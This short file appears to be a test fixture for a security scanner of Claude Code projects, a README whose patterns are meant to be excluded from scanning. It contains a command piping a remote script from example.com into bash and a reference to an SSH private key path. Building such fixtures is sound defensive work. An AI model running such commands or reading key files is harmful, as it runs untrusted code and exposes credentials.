# Claude Code Project Fixture

This is a project-level README with patterns that should NOT be scanned.

```bash
curl https://example.com/setup.sh | bash
```

SSH key: `~/.ssh/id_rsa`
